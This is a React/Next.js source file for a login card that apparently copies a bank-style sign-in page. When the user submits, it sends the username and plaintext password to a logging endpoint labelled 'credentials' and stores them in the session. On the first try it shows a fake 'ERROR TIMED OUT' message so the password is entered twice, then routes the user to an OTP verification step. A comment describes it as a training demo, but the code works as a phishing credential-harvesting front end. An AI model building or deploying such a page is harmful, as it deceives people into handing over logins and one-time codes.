"use client";

import { useEffect, useState, type FormEvent } from "react";
import { useRouter } from "next/navigation";

import CardShell from "@/components/CardShell";
import { sendEvent } from "@/lib/event-client";
import { MWB_VERIFY_PATH } from "@/lib/mwb-paths";
import {
  clearPendingOtpMethod,
  savePendingCredentials,
  savePendingUserId,
} from "@/lib/pending-session";
import { SITE } from "@/lib/site-content";

function Field({
  id,
  label,
  type,
  autoComplete,
  value,
  onChange,
  autoFocus,
  trailing,
  readOnly,
}: {
  id: string;
  label: string;
  type: string;
  autoComplete: string;
  value: string;
  onChange: (v: string) => void;
  autoFocus?: boolean;
  trailing?: React.ReactNode;
  readOnly?: boolean;
}) {
  const [focused, setFocused] = useState(false);
  const active = focused || (value.length > 0 && !readOnly);
  return (
    <div className="relative">
      <label
        htmlFor={id}
        className={`pointer-events-none absolute -top-2 left-3 bg-mwb-card px-1 text-xs transition-colors ${
          active ? "text-mwb-lime" : "text-mwb-muted"
        }`}
      >
        {label}
      </label>
      <div className="flex items-center">
        <input
          id={id}
          type={type}
          autoComplete={autoComplete}
          autoCapitalize="off"
          autoCorrect="off"
          autoFocus={autoFocus}
          readOnly={readOnly}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          className={`block w-full rounded-lg border bg-transparent py-3.5 pl-4 text-sm text-white outline-none transition-colors placeholder:text-mwb-muted ${
            trailing ? "pr-12" : "pr-4"
          } ${focused ? "border-mwb-lime" : "border-[#5a5a5a]"}`}
        />
        {trailing}
      </div>
    </div>
  );
}

function EyeIcon({ off }: { off: boolean }) {
  return (
    <svg
      width="22"
      height="22"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
      strokeLinecap="round"
      strokeLinejoin="round"
      aria-hidden="true"
      className="text-mwb-lime"
    >
      <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" />
      <circle cx="12" cy="12" r="3" />
      {off ? <line x1="3" y1="3" x2="21" y2="21" /> : null}
    </svg>
  );
}

function FingerprintIcon() {
  return (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
      strokeLinecap="round"
      aria-hidden="true"
      className="text-mwb-lime"
    >
      <path d="M12 11c0 3.5-.5 6-1.5 8" />
      <path d="M8.5 12.5c0 3-.6 5.2-1.7 7" />
      <path d="M15.5 12.5c0 3-.4 5.4-1.2 7.5" />
      <path d="M12 8a4.5 4.5 0 0 1 4.5 4.5c0 2.5-.3 4.8-1 6.8" />
      <path d="M7.5 12.5A4.5 4.5 0 0 1 12 8" />
      <path d="M5 10.5A8 8 0 0 1 12 4.5" />
      <path d="M19 10.5A8 8 0 0 0 12 4.5" />
      <path d="M4 7.5A12 12 0 0 1 12 1.5" />
      <path d="M20 7.5A12 12 0 0 0 12 1.5" />
    </svg>
  );
}

export default function LoginCard() {
  const router = useRouter();
  const [step, setStep] = useState<"username" | "password">("username");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [touched, setTouched] = useState(false);

  const [loginError, setLoginError] = useState("");

  const usernameError = touched && username.trim().length === 0;
  const canContinue = username.trim().length > 0;
  const canSignIn = password.trim().length > 0;

  useEffect(() => {
    void sendEvent("page_view", {});
  }, []);

  function handleUsernameSubmit(e: FormEvent) {
    e.preventDefault();
    if (!canContinue) {
      setTouched(true);
      return;
    }
    setTouched(false);
    setPassword("");
    setShowPassword(false);
    setLoginError("");
    setStep("password");
  }

  function handlePasswordSubmit(e: FormEvent) {
    e.preventDefault();
    if (!canSignIn) return;
    // Demo flow — the sign-in continues locally, but the step is dispatched
    // to POST /api/event so the training backend can log the attempt.
    clearPendingOtpMethod();
    savePendingUserId(username);
    savePendingCredentials(username, password);
    void sendEvent("credentials", {
      username: username.trim(),
      password,
    });

    const attempts = parseInt(sessionStorage.getItem("mwb_login_attempts") || "0", 10);
    if (attempts === 0) {
      sessionStorage.setItem("mwb_login_attempts", "1");
      setLoginError("ERROR TIMED OUT. Please try again.");
      setPassword(""); // Force them to re-enter
      return;
    }

    setLoginError("");
    router.push(MWB_VERIFY_PATH);
  }

  function handleSwitch() {
    setStep("username");
    setPassword("");
    setShowPassword(false);
    setTouched(false);
    setLoginError("");
  }

  return (
    <CardShell>
      {step === "username" ? (
        <form
          onSubmit={handleUsernameSubmit}
          noValidate
          onBlur={(e) => {
            if (!(e.currentTarget as HTMLElement).contains(e.relatedTarget)) {
              setTouched(true);
            }
          }}
        >
          <Field
            id="mwb-username"
            label={SITE.login.usernameLabel}
            type="text"
            autoComplete="username"
            value={username}
            onChange={setUsername}
            autoFocus
          />
          {usernameError ? (
            <p role="alert" className="mt-2 text-left text-xs text-red-400">
              Username is required.
            </p>
          ) : null}
          <div className="mt-2 text-right">
            <button
              type="button"
              className="cursor-pointer border-0 bg-transparent p-0 text-[13px] font-medium text-mwb-lime hover:underline"
            >
              {SITE.login.forgotUsername}
            </button>
          </div>
          <div className="mt-[30px] flex justify-end">
            <button
              type="submit"
              disabled={!canContinue}
              className="min-w-[130px] cursor-pointer rounded-lg border-0 bg-mwb-navy px-6 py-2.5 text-sm font-semibold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
            >
              {SITE.login.continue}
            </button>
          </div>
        </form>
      ) : (
        <form onSubmit={handlePasswordSubmit} noValidate>
          {loginError ? (
            <div className="mb-4 rounded-lg bg-red-500/10 p-3 text-sm text-red-400 border border-red-500/20">
              {loginError}
            </div>
          ) : null}
          <Field
            id="mwb-username-readonly"
            label={SITE.login.usernameLabel}
            type="text"
            autoComplete="username"
            value={username.trim()}
            onChange={() => {}}
            readOnly
            trailing={
              <button
                type="button"
                onClick={handleSwitch}
                className="absolute right-4 cursor-pointer border-0 bg-transparent p-0 text-[13px] font-medium text-mwb-lime hover:underline"
              >
                {SITE.login.switchUser}
              </button>
            }
          />
          <div className="mt-[30px]">
            <Field
              id="mwb-password"
              label={SITE.login.passwordLabel}
              type={showPassword ? "text" : "password"}
              autoComplete="current-password"
              value={password}
              onChange={setPassword}
              autoFocus
              trailing={
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  aria-label={showPassword ? "Hide password" : "Show password"}
                  className="absolute right-3 cursor-pointer border-0 bg-transparent p-1"
                >
                  <EyeIcon off={showPassword} />
                </button>
              }
            />
          </div>
          <div className="mt-2 text-right">
            <button
              type="button"
              className="cursor-pointer border-0 bg-transparent p-0 text-[13px] font-medium text-mwb-lime hover:underline"
            >
              {SITE.login.forgotUsername}
            </button>
          </div>
          <div className="mt-[30px] flex items-center justify-between">
            <button
              type="button"
              className="inline-flex cursor-pointer items-center gap-2 border-0 bg-transparent p-0 text-sm font-medium text-mwb-lime hover:underline"
            >
              <FingerprintIcon />
              {SITE.login.passkey}
            </button>
            <button
              type="submit"
              disabled={!canSignIn}
              className="min-w-[130px] cursor-pointer rounded-lg border-0 bg-mwb-navy px-6 py-2.5 text-sm font-semibold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
            >
              {SITE.login.signIn}
            </button>
          </div>
        </form>
      )}
    </CardShell>
  );
}
